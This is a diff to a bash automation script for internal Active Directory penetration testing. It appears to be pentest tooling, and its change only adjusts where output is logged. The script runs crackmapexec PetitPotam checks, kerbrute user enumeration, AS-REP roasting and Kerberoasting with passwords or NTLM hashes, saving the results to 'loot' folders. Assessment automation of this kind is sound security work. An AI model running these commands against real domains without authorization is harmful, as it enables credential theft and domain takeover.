@@ -95,7 +95,7 @@ echo "CME PetitPotam unauthenticated" >>/root/output/runtime.txt
 date >>/root/output/runtime.txt
 # CME User unauthenticated
 echo "CME PetitPotam unauthenticated"
-crackmapexec smb "$IP" -M petitpotam >>/root/output/loot/intern/rpc/petit_potam/"$IP"_unauthenticated 2>&1
+crackmapexec smb "$IP" -M petitpotam >>/root/output/loot/intern/rpc/petit_potam/"$IP"_unauthenticated.txt 2>&1
 
 if [ -z "$HASH" ]; then
   # Use Password
@@ -125,7 +125,7 @@ if [ -z "$HASH" ]; then
   date >>/root/output/runtime.txt
   # Kerbrute
   echo "kerbrute userenum"
-  kerbrute userenum /root/output/list/user.txt -d "$DOM" >/root/output/loot/intern/ad/kerberos/user_enum/kerbrute_"$DOM".txt
+  kerbrute userenum /root/output/list/user.txt -d "$DOM" >>/root/output/loot/intern/ad/kerberos/user_enum/kerbrute_"$DOM".txt
 
   echo "CME Pass-Pol" >>/root/output/runtime.txt
   date >>/root/output/runtime.txt
@@ -173,13 +173,13 @@ if [ -z "$HASH" ]; then
   date >>/root/output/runtime.txt
   # asreproast
   echo "CME ASRep"
-  crackmapexec ldap "$FQDN" -u "$USER" -p "$PASS" -d "$DOM" --asreproast /root/output/loot/intern/ad/kerberos/asreproast/asrep_"$DOM".txt
+  crackmapexec ldap "$FQDN" -u "$USER" -p "$PASS" -d "$DOM" --asreproast /root/output/loot/intern/ad/kerberos/asreproast/asrep_"$DOM".txt >>/root/output/loot/intern/ad/kerberos/asreproast/raw_"$DOM".txt 2>&1
 
   echo "CME Kerberoast" >>/root/output/runtime.txt
   date >>/root/output/runtime.txt
   # kerberoast
   echo "CME Kerberoast"
-  crackmapexec ldap "$FQDN" -u "$USER" -p "$PASS" -d "$DOM" --kerberoasting /root/output/loot/intern/ad/kerberos/kerberoasting/krb_"$DOM".txt
+  crackmapexec ldap "$FQDN" -u "$USER" -p "$PASS" -d "$DOM" --kerberoasting /root/output/loot/intern/ad/kerberos/kerberoasting/krb_"$DOM".txt >>/root/output/loot/intern/ad/kerberos/kerberoasting/raw_"$DOM".txt 2>&1
 
   echo "CME MAQ" >>/root/output/runtime.txt
   date >>/root/output/runtime.txt
@@ -249,7 +249,7 @@ if [ -z "$PASS" ]; then
   date >>/root/output/runtime.txt
   # Kerbrute
   echo "kerbrute userenum"
-  kerbrute userenum /root/output/list/user.txt -d "$DOM" >/root/output/loot/intern/ad/kerberos/user_enum/kerbrute_"$DOM".txt
+  kerbrute userenum /root/output/list/user.txt -d "$DOM" >>/root/output/loot/intern/ad/kerberos/user_enum/kerbrute_"$DOM".txt
 
   echo "CME Pass-Pol" >>/root/output/runtime.txt
   date >>/root/output/runtime.txt
@@ -297,13 +297,13 @@ if [ -z "$PASS" ]; then
   date >>/root/output/runtime.txt
   # asreproast
   echo "CME ASRep"
-  crackmapexec ldap "$FQDN" -u "$USER" -H "$HASH" -d "$DOM" --asreproast /root/output/loot/intern/ad/kerberos/asreproast/asrep_"$DOM".txt
+  crackmapexec ldap "$FQDN" -u "$USER" -H "$HASH" -d "$DOM" --asreproast /root/output/loot/intern/ad/kerberos/asreproast/asrep_"$DOM".txt >>/root/output/loot/intern/ad/kerberos/asreproast/raw_"$DOM".txt 2>&1
 
   echo "CME Kerberoast" >>/root/output/runtime.txt
   date >>/root/output/runtime.txt
   # kerberoast
   echo "CME Kerberoast"
-  crackmapexec ldap "$FQDN" -u "$USER" -H "$HASH" -d "$DOM" --kerberoasting /root/output/loot/intern/ad/kerberos/kerberoasting/krb_"$DOM".txt
+  crackmapexec ldap "$FQDN" -u "$USER" -H "$HASH" -d "$DOM" --kerberoasting /root/output/loot/intern/ad/kerberos/kerberoasting/krb_"$DOM".txt >>/root/output/loot/intern/ad/kerberos/kerberoasting/raw_"$DOM".txt 2>&1
 
   echo "CME MAQ" >>/root/output/runtime.txt
   date >>/root/output/runtime.txt
